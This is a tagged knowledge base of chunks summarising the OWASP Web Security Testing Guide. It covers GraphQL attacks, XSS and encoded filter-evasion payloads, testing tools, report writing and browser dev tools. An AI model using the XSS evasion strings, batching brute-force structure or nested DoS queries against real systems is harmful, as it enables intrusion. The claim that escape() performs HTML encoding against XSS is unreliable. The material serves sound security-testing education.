{"id": "kb-001855", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "The code snippet 'window.onerror = function(err) {alert(err)}' demonstrates how JavaScript can capture error messages and alert them, potentially exposing sensitive data. Sensitive Data Leakage via Prototype Chaining occurs due to the dynamic scoping of the 'this' keyword in JavaScript."}
{"id": "kb-001856", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "When an attacker overrides the native method, such as Array.prototype.forEach with their own function, they can exploit the context of 'this' to access sensitive information stored in an object or array."}
{"id": "kb-001857", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "An example involving an array with sensitive data being manipulated showcases how the attack is executed, pointing out the risks associated with improperly secured JavaScript functions. The web security testing guide highlights the risks associated with JavaScript code that can lead to sensitive data leakage."}
{"id": "kb-001858", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "A sample JavaScript code snippet illustrates how sensitive data can be manipulated and displayed unintentionally on a web page through the `forEach` method of the Array prototype."}
{"id": "kb-001859", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The method `Array.prototype.forEach` is overridden to construct a string that reveals sensitive data stored in an array, demonstrating a potential security flaw where sensitive information is exposed to users or attackers."}
{"id": "kb-001860", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Important concepts include the idea that modifying built-in objects in JavaScript can lead to unexpected behavior and security vulnerabilities, such as data leakage."}
{"id": "kb-001861", "section": null, "tags": ["API", "CLIENT"], "source": "wstg-v4.2.pdf", "text": "The context suggests that the `script src` tag is included to load external JavaScript code, which could also enhance the security risk if that external source is compromised. GraphQL simplifies API development by providing nested objects, but it can introduce new security risks."}
{"id": "kb-001862", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Common attack vectors for GraphQL include Introspection Queries, which allow attackers to discover supported queries and data types that can be exploited."}
{"id": "kb-001863", "section": null, "tags": ["API", "CONF", "HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Testing objectives for GraphQL security include ensuring secure configurations are deployed, validating input fields against attacks (e.g., SQL injection), and enforcing proper access controls."}
{"id": "kb-001864", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Introspection queries allow for the retrieval of a GraphQL schema's information, which is crucial for conducting effective security testing."}
{"id": "kb-001865", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example query structure for an introspection request is: 'query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } }'."}
{"id": "kb-001866", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The text appears to describe fragments of a GraphQL schema, specifically detailing the characteristics of types, inputs, and their relationships. Key components include: - FullType: Represents a type in GraphQL, detailing its fields, input fields, interfaces, enum values, and possible types. This structure is essential for understanding how data is shaped and integrated within a GraphQL API. - InputValue: Defined under the FullType fragment, represents the characteristics of input values used in the GraphQL queries. It includes fields like name, description, type, and defaultValue, underscoring how API endpoints consume data. - TypeRef: This fragment denotes a reference type structure, indicating the potential nested types that may exist, crucial for interpreting complex schema relationships."}
{"id": "kb-001867", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Important terms include `fields`, `inputFields`, `interfaces`, `enumValues`, and `possibleTypes`, each defining a specific component of the GraphQL schema architecture. Understanding these concepts is essential for developing secure and effective applications interacting with GraphQL APIs. The result of a GraphQL deployment contains the entire schema, which can be very lengthy. __schema is a key component of the GraphQL schema, outlining the types of operations available: query, mutation, and subscription."}
{"id": "kb-001868", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The queryType refers to the operations that allow data retrieval from the server. The mutationType allows for data modifications, while the subscriptionType facilitates real-time data updates."}
{"id": "kb-001869", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "The ENUM __TypeKind describes various types within GraphQL: SCALAR, OBJECT, INTERFACE, and UNION, each with specific meanings regarding what kinds of types they represent. SCALAR: This type indicates a primitive value (such as String, Int, etc.). OBJECT: This indicates a composite type that can have fields and interfaces. INTERFACE: Represents a structure that multiple object types can share, comprising fields and possible types that implement it. UNION: A union allows returning different object types from a single field, reflecting multiple potential types."}
{"id": "kb-001870", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "GraphQL Voyager is a tool used to visualize the GraphQL schema in the form of an Entity Relationship Diagram (ERD), which helps users understand the structure of the GraphQL API being tested."}
{"id": "kb-001871", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "When using GraphQL Voyager, it is noted that while it provides insights into available queries and properties, such as the Dog table and its attributes (ID, name, veterinary ID), it does not display all functionalities, such as available mutations."}
{"id": "kb-001872", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "GraphiQL is a web-based IDE for GraphQL that assists in debugging and development. It is advised not to allow user access in production environments to maintain security, but it is useful in staging environments for testing"}
{"id": "kb-001873", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "GraphiQL provides a documentation section that compiles the schema's data types, mutations, and other accessible information through introspection queries, aiding developers and testers."}
{"id": "kb-001874", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "GraphQL Playground serves as a GraphQL client that allows users to test various queries and organize different workspaces. It can generate documentation automatically without manual introspection queries, providing a convenient testing environment."}
{"id": "kb-001875", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "GraphQL Playground offers the ability to test for vulnerabilities without a personal proxy, making it simpler to interact with and assess GraphQL endpoints, while still allowing advanced payloads with a personal proxy when needed."}
{"id": "kb-001876", "section": null, "tags": ["API", "AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "In using tools like GraphQL Playground, users may need to set HTTP headers for authentication, indicating the importance of securing access with correct permissions. Introspection in GraphQL provides insight into the schema but can expose sensitive information if not properly secured."}
{"id": "kb-001877", "section": null, "tags": ["API", "AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Best practices recommend limiting access to introspection queries to enhance security, while acknowledging that some tools may require this feature to function. Authorization in GraphQL is essential as it typically does not enforce permissions without explicit application-level enforcement. Testers should scrutinize introspection responses for authorization vulnerabilities to uncover potential data leaks."}
{"id": "kb-001878", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "An example of a vulnerability is illustrated where unauthenticated users can access sensitive information such as API tokens, which can lead to unauthorized actions within the application."}
{"id": "kb-001879", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Testing authorization weaknesses involves sending queries that exploit insufficient privilege checks, as demonstrated in the example of extracting a veterinarian's information using an unauthorized token."}
{"id": "kb-001880", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Proper authorization enforcement is critical to prevent unauthorized access to user resources, as demonstrated with Benoit's dog list example."}
{"id": "kb-001881", "section": null, "tags": ["API", "SQLI", "XSS"], "source": "wstg-v4.2.pdf", "text": "GraphQL serves as an API layer, which can amplify certain vulnerabilities when improperly secured. Regular injection vulnerabilities (SQL injection, XSS, etc.) can still occur through GraphQL entry points."}
{"id": "kb-001882", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "GraphQL scalars are custom data types that may lack built-in validation, making them susceptible to various testing scenarios. Developers should ensure adequate validation for these scalar types to minimize vulnerabilities."}
{"id": "kb-001883", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "SQL injection is a significant risk in applications that concatenate user input directly into SQL queries. This practice can lead to unauthorized data access."}
{"id": "kb-001884", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "The provided SQL injection example demonstrates how a seemingly simple query can be exploited by inserting malicious SQL intended to extract data from a hidden database table, indicating poor input handling."}
{"id": "kb-001885", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The example highlights a common misconception in application security: concatenating user input into queries can expose systems to critical vulnerabilities."}
{"id": "kb-001886", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The query shown contains a sensitive piece of information that is critical for web application security, specifically the secret used to sign JSON Web Tokens (JWTs)."}
{"id": "kb-001887", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Understanding the architecture of an application, particularly how it is built and how database tables are structured, is essential when performing security testing."}
{"id": "kb-001888", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "SQL injection vulnerabilities can be identified and tested using tools like sqlmap, which can automate the detection and extraction of data from databases."}
{"id": "kb-001889", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "Cross-Site Scripting (XSS) is a vulnerability that enables attackers to inject executable code into web applications, which is then executed by the browser."}
{"id": "kb-001890", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "For testing reflected XSS, a typical payload that can be used is '<script>alert('1')</script>', which can be examined in the context of functions accepting user inputs, like 'myInfo' in the example."}
{"id": "kb-001891", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Validation errors in response to XSS payloads can provide insights into the type of input the application expects, such as how the application reacts to unexpected data types, as shown in the provided validation error message."}
{"id": "kb-001892", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Denial of Service (DoS) attacks can be carried out through GraphQL by exploiting its capability for nested queries, which may use significant CPU and memory resources."}
{"id": "kb-001893", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A deep nested query can create a recursive-like effect, leading to potential overload of application resources. Example provided demonstrates how a query can keep nesting objects indefinitely, escalating resource usage."}
{"id": "kb-001894", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The example query illustrates a loop where each 'Dog' object contains a 'Veterinary' object leading to an excessive depth of nesting, which could exhaust system resources."}
{"id": "kb-001895", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Preventative measures against abusive queries in GraphQL are outlined in the remediation section, and it is critical to include testing for these types of attacks in web security assessments."}
{"id": "kb-001896", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Batching attacks in GraphQL allow multiple queries to be sent in a single request, which can be exploited by attackers to perform efficient brute force attacks without detection."}
{"id": "kb-001897", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Example of a batching attack structure includes an array of queries along with their variables: [{ query: < query 0 >, variables: < variables for query 0 > }, ...]."}
{"id": "kb-001898", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example application demonstrates how an attacker can use batching to extract veterinary names by guessing IDs, allowing access tokens to be obtained more effectively than with individual requests."}
{"id": "kb-001899", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The potential for bypassing security measures like web application firewalls or rate limiters increases with batching attacks, as they reduce the number of requests to the server."}
{"id": "kb-001900", "section": null, "tags": ["API", "CONF"], "source": "wstg-v4.2.pdf", "text": "Error messages in GraphQL applications can reveal sensitive internal information when runtime errors occur. Malicious users can use detailed error messages to gain insights into application configuration or data."}
{"id": "kb-001901", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Fuzzing is a technique used to test error messages by sending unexpected data to reveal vulnerabilities or sensitive information in responses."}
{"id": "kb-001902", "section": null, "tags": ["API", "AUTHZ"], "source": "wstg-v4.2.pdf", "text": "GraphQL is a technology that enables applications to transition from traditional APIs, but improper authorization checks can lead to privilege escalation."}
{"id": "kb-001903", "section": null, "tags": ["API", "AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Requests to an underlying API may be misinterpreted, allowing unauthorized actions; for example, the parameter 'id=1/delete' can manipulate user resources. Testers are encouraged to access underlying API methods as part of security testing to identify potential privilege escalations."}
{"id": "kb-001904", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Remediation strategies include restricting access to introspection queries and implementing rigorous input validation, but additional measures are necessary to mitigate injection attacks."}
{"id": "kb-001905", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Tools for mitigating GraphQL vulnerabilities include GraphQL Playground, GraphQL Voyager, and various Burp Suite extensions such as InQL and GraphQL Raider."}
{"id": "kb-001906", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "To mitigate the risk of abusive queries in GraphQL, it's important to implement restrictions such as timeouts, maximum query depth, maximum query complexity, server-time-based throttling, and query-complexity-based throttling materials. Generic error messages should be used to avoid revealing sensitive deployment details during error handling. Measures to mitigate batching attacks include object request rate limiting and limiting simultaneous queries. Further resources such as the GraphQL Cheat Sheet provide more detailed guidance on remediating GraphQL weaknesses."}
{"id": "kb-001907", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The final product of a security assessment is a well-written and informative report that is easy to understand and highlights all risks identified during the assessment. Effective reporting is essential to help clients understand findings and showcase the quality of technical testing conducted."}
{"id": "kb-001908", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Reports should be tailored for their audience; a consultancy-based report might include more detail than an internal report or bug bounty report. It is advisable to secure and encrypt reports to ensure that only the intended recipients can access them."}
{"id": "kb-001909", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Key sections that may be included in a security assessment report are: introduction, version control, team qualifications, scope of work, limitations of the testing, timeline of the assessment, and a disclaimer for liability."}
{"id": "kb-001910", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A disclaimer for security services is important and should be created with legal assistance, as it must be legally binding. It specifies that results from a security assessment are based on a snapshot in time and may not encompass all current security issues due to changes in the environment or new vulnerabilities that may arise."}
{"id": "kb-001911", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The Executive Summary of a security testing report serves to provide a concise overview to executives, highlighting the test's objective, the business need behind the test, how it assisted the organization, key findings in a business context, and strategic non-technical recommendations to prevent future issues."}
{"id": "kb-001912", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The Findings section is tailored for the technical team and includes comprehensive details that allow them to understand and replicate vulnerabilities. It suggests organizing findings into sections for clarity, for example, separating External and Internal Access vulnerabilities."}
{"id": "kb-001913", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Finding summaries should include a reference ID, title, and risk level to aid in communication and prioritization of vulnerabilities. A structured format, such as a table, is recommended for readability and ease of use."}
{"id": "kb-001914", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Each finding should detail the following: Reference ID, title (e.g., 'User Authentication Bypass'), likelihood of exploitability, required access level, and potential impact on the system, categorized using a risk scale (Informational, Low, Medium, High, Critical). An appendix should be included to clarify how risk levels are assigned."}
{"id": "kb-001915", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**OWASP ZAP**: The Zed Attack Proxy (ZAP) is an integrated penetration testing tool for identifying vulnerabilities in web applications. It caters to a wide range of security experience levels, making it suitable for developers and functional testers new to penetration testing. ZAP features automated scanners and manual tools for locating security vulnerabilities."}
{"id": "kb-001916", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "**Burp Proxy**: This is an intercepting proxy server used for security testing of web applications. It intercepts and modifies HTTP(S) traffic, functioning with custom SSL certificates and non-proxy-aware clients, which enables comprehensive traffic analysis and manipulation."}
{"id": "kb-001917", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "**Firefox HTTP Header Live**: A useful tool for viewing HTTP headers of a web page and during browser sessions, aiding in understanding server-client communication."}
{"id": "kb-001918", "section": null, "tags": ["HTTP", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "**Firefox Tamper Data**: This extension allows users to view and modify HTTP/HTTPS headers and post parameters, providing essential features for testing request integrity and security."}
{"id": "kb-001919", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**w3af**: Short for Web Application Attack and Audit Framework, w3af aims to find and exploit vulnerabilities in web applications, facilitating robust web security assessments."}
{"id": "kb-001920", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "**HTTP Request Maker**: A penetration testing tool that captures requests made by web pages, allowing users to tamper with URLs, headers, and POST data for security testing purposes."}
{"id": "kb-001921", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "**Cookie Editor**: This tool manages cookies, providing functionalities to add, delete, edit, search, protect, and block cookies, fundamental for session management and manipulating user data."}
{"id": "kb-001922", "section": null, "tags": ["AUTHN", "CONF", "CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "**Session Manager**: A utility to save and reload the browser's state quickly, managing multiple sessions and retaining opened tabs and windows, essential for testing different user scenarios seamlessly. SSLScan: A tool used to scan and verify SSL/TLS configurations. Password Crackers: Tools such as John the Ripper and HashCat are utilized for cracking password hashes. Remote Brute Force Testing: Tools like Patator and THC Hydra are designed for executing remote brute-force attacks. Buffer Overflow Testing: OllyDbg is a windows-based debugger for analyzing buffer overflow vulnerabilities. Fuzzers: Spike is introduced as a fuzzer framework for exploring vulnerabilities and performing length testing. Metasploit: A framework that facilitates rapid exploit development and testing. Googling: Bishop Fox’s Google Hacking Diggity Project is mentioned as a resource for Google hacking techniques."}
{"id": "kb-001923", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Commercial Black-Box Testing Tools: Lists various tools like NGS Typhon, HCL AppScan, and Acunetix Web Vulnerability Scanner for security assessments. Linux Distributions: Kali is referenced as a penetration testing-focused Linux distribution."}
{"id": "kb-001924", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Acceptance testing tools validate the functionality of web applications, often following a scripted approach that utilizes a Unit Testing framework to create test suites and cases. Most acceptance testing tools can be adapted for security-specific tests alongside regular functional tests."}
{"id": "kb-001925", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "BDD (Behavior-Driven Development) Security is mentioned in relation to open source testing tools, although details are not provided on the page."}
{"id": "kb-001926", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "HtmlUnit is a Java and JUnit based framework that employs the Apache HttpClient for transport, noted for being robust and highly configurable, and is used as an engine for various other testing tools."}
{"id": "kb-001927", "section": null, "tags": ["CLIENT", "HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Selenium is a JavaScript-based testing framework that operates cross-platform and offers a graphical user interface (GUI) for the creation of tests. Fuzzing is described as the 'kitchen sink' approach to testing applications by manipulating parameters to observe application responses. The primary goal of fuzzing is to identify error conditions or abnormal behaviors in an application. Several references and resources are provided as input sources for fuzzing, including: - Cross-site scripting (XSS) cheat sheet - AwesomeXSS - Payloads All The Things - Big List of Naughty Strings - Bo0oM Fuzz List - FuzzDB - bl4de Dictionaries - Open Redirect Payloads - EdOverflow Bug Bounty Cheat Sheet - Daniel Miessler - SecLists - XssPayloads Twitter Feed"}
{"id": "kb-001928", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Character encoding is the process of mapping characters and symbols to a standard format for message transmission between sender and receiver. Common character encoding schemes include ASCII (American Standard Code for Information Interchange) and Unicode (UTF-8 and UTF-16)."}
{"id": "kb-001929", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "In application security, character encoding can be misused to encode malicious injection strings, allowing these strings to bypass input validation filters or exploit browser behavior."}
{"id": "kb-001930", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Input filters in web applications can fail if they only recognize a limited set of encoding schemes, making it possible for attackers to use alternative encoding methods to bypass protections. For example, the character '/' can be represented differently in various encoding schemes, such as 2F in ASCII and C0 AF in Unicode."}
{"id": "kb-001931", "section": null, "tags": ["HTTP", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Web browsers require knowledge of the encoding scheme to correctly display web pages, which should be specified in the HTTP header or HTML META tag. The Content-Type field in HTTP headers takes precedence over the META tag for character encoding declarations."}
{"id": "kb-001932", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "If a web server does not specify character encoding, it can lead to ambiguity regarding which characters are treated as special or benign, potentially exposing vulnerabilities. CERT states that many web pages leave character encoding undefined, leading to inconsistencies across browsers regarding default encodings."}
{"id": "kb-001933", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Correct browser behavior regarding character encoding makes it harder to prevent malicious script attacks due to the server's inability to recognize byte sequences for special characters."}
{"id": "kb-001934", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "When the server does not provide character encoding information, browsers will either guess the encoding scheme or revert to a default scheme, which can lead to mismatches in interpreting the web page."}
{"id": "kb-001935", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Encoded injections are a way of obfuscating input to bypass filters, and their success often depends on the browser used. For example, US-ASCII encoded injections were effective in Internet Explorer but not in Firefox."}
{"id": "kb-001936", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "A basic encoded injection example is <script>alert(String.fromCharCode(88,83,83))</script>, which can bypass simple input validation filters that protect against single quotes."}
{"id": "kb-001937", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "HTML Entities can construct injection strings. An example is <IMG src='' onerror='javascript:alert(&quot;XSS&quot;)'> where &quot; represents a double quote."}
{"id": "kb-001938", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Hex encoding is another obfuscation method, with examples like <IMG SRC=%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%58%53%53%27%29>, allowing the injection to circumvent filters that prevent plain text."}
{"id": "kb-001939", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Variations of hex encoding, such as using hexadecimal representation of characters like <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>, can be effective if '%' is being filtered."}
{"id": "kb-001940", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Obfuscation can be achieved through various encoding schemes such as Base64 and Octal, although success may vary and require trial and error."}
{"id": "kb-001941", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "UTF-7 encoding is an encoding standard that can represent characters using special formats, and it can be exploited for XSS attacks if not properly handled by input validation."}
{"id": "kb-001942", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "As an example, the script: <SCRIPT> alert('XSS'); </SCRIPT> is encoded in UTF-7 as +ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4- to bypass filters."}
{"id": "kb-001943", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Multi-byte Encoding, a form of variable-width encoding, encodes characters using a varying number of bytes and is useful for representing characters from large character sets, including those from Asian languages."}
{"id": "kb-001944", "section": null, "tags": ["HTTP", "SQLI", "XSS"], "source": "wstg-v4.2.pdf", "text": "This encoding technique has been exploited in the past to bypass standard input validation and facilitate cross-site scripting (XSS) and SQL injection attacks."}
{"id": "kb-001945", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The Developer Tools (Dev Tools) available in browsers can greatly aid security testing, although they are not a replacement for more specialized testing tools such as DAST (Dynamic Application Security Testing) and SAST (Static Application Security Testing)."}
{"id": "kb-001946", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Dev Tools can be accessed through several methods, including keyboard shortcuts, right-click context menus, and menu options in various browsers such as Chrome, Firefox, and Edge/IE."}
{"id": "kb-001947", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Common methods to open Dev Tools include:\n1. F12 keyboard shortcut\n2. ctrl + shift + i on Windows\n3. cmd + option + i on Mac\n4. Right-click -> Inspect in Chrome\n5. Right-click -> Inspect Element in Firefox\n6. Selecting More Tools -> Developer Tools in Chrome's menu\n7. Selecting Web Developer -> Toggle Tools in Firefox's menu\n8. Developer Tools from Edge/IE settings menu."}
{"id": "kb-001948", "section": null, "tags": ["CLIENT", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Key functionalities of Dev Tools vary by browser. For instance:\n- User-Agent Switching is available in all mentioned browsers.\n- Editing and resending requests is only available in Firefox.\n- Cookie and local storage editing is supported in Chrome, Firefox, and Edge/IE, not in Safari.\n- Options to disable CSS or JavaScript exist in most browsers but not in all.\n- Viewing HTTP headers and taking screenshots is supported across several browsers."}
{"id": "kb-001949", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The ability of Dev Tools to simulate offline mode, toggle responsive design, and perform encoding/decoding tasks makes it a valuable asset in web security testing. Testing for browser cache weaknesses is important for web security assessment. In Google Chrome, the user agent can be modified using Developer Tools for testing purposes."}
{"id": "kb-001950", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Steps to change the user agent in Google Chrome include clicking on the triple dot menu on the right side of the Developer Tools pane, selecting 'More tools', and then choosing 'Network conditions'. Unchecking the 'Select automatically' checkbox allows for the selection or entry of a custom user agent."}
{"id": "kb-001951", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "To override the User-Agent in Mozilla Firefox, navigate to the about:config page and accept any risks. Use the search field to find 'general.useragent.override'. If not available, create this preference as a String type. You can then set the User-Agent to your required value and later delete this entry to revert to the default User-Agent."}
{"id": "kb-001952", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "For editing and resending HTTP requests in Firefox, access the Network tab, perform an action in the web application, then right-click on the request and select 'Edit and Resend'. After making modifications, click 'Send' and you can open the modified request in a new tab."}
{"id": "kb-001953", "section": null, "tags": ["AUTHN", "AUTHZ", "BUSINESS", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Understanding the context of related testing categories such as Authentication Testing, Authorization Testing, Session Management Testing, Input Validation Testing, and Business Logic Testing is essential for comprehensive web security evaluations, particularly when modifying web requests or managing cookies."}
{"id": "kb-001954", "section": null, "tags": ["HTTP", "SESSION", "SQLI"], "source": "wstg-v4.2.pdf", "text": "To edit cookies in Google Chrome, users should navigate to the 'Application' tab, expand the 'Cookies' section, select the relevant domain, and double click in the 'Value' column to make changes. Cookies can also be deleted using the delete key or from the right-click context menu."}
{"id": "kb-001955", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "In Mozilla Firefox, the process of editing cookies involves clicking the 'Storage' tab, expanding the 'Cookies' section, selecting the relevant domain name, and editing the cookie value in the 'Value' column. Similar deletion methods apply as in Chrome."}
{"id": "kb-001956", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "For local storage editing in Google Chrome, users should go to the 'Application' tab, expand 'Local Storage', select the relevant domain, and double click in the 'Value' column to edit any values. Users can also modify keys directly in applicable cells and utilize right-click options to add or delete items."}
{"id": "kb-001957", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Mozilla Firefox users follow a similar procedure for local storage; they click the 'Storage' tab, expand the 'Local Storage' section, and edit keys or values by double-clicking the cells. Items can also be added or deleted via right-click options."}
{"id": "kb-001958", "section": null, "tags": ["CLIENT", "HTTP", "SESSION", "SQLI"], "source": "wstg-v4.2.pdf", "text": "The document refers to related testing for browser storage that can help identify potential vulnerabilities due to improper management or manipulation of cookies and local storage. All major browsers provide tools for manipulating CSS through JavaScript and the Dev Tools Console. JavaScript commands to remove styles: - To remove all external stylesheets: `$('style,link[rel=\"stylesheet\"]').remove();` - To remove all internal stylesheets: `$('style').remove();` - To remove all inline styles: `Array.prototype.forEach.call(document.querySelectorAll('*'),function(el){el.removeAttribute('style');});` - To remove everything from the head tag: `$('head').remove();` Method to disable JavaScript in Google Chrome: 1. Click on the triple dot ‘kabob’ menu in the web developer toolbar and go to Settings. 2. Under Preferences -> Debugger section, check the Disable JavaScript checkbox. Method to disable JavaScript in Mozilla Firefox: 1. In the dev tools Debugger tab, click the settings gear button on the upper right side. 2. Select Disable JavaScript from the dropdown menu. To view HTTP headers in Google Chrome: 1. Go to the Networking tab in Dev Tools and select a URL or request. 2. In the lower right pane, select the Headers tab."}
{"id": "kb-001959", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Encoding and Decoding are critical in Web Application Security Testing, allowing various manipulations of strings to aid in detecting vulnerabilities."}
{"id": "kb-001960", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "Major browsers provide built-in support for encoding and decoding through JavaScript in the Dev Tools Console, which is a valuable resource for security testers. Key encoding functions include: - Base64 encoding is performed using `btoa(string)` and decoding with `atob(string)`. This is used to encode binary data as ASCII. - URL encoding is done with `encodeURIComponent(string)` and decoding with `decodeURIComponent(string)`, essential for handling special characters in URLs. - HTML encoding can be achieved with `escape(string)` and decoding with `unescape(string)`, helping to prevent XSS vulnerabilities by converting characters into a representation that is safe for HTML."}
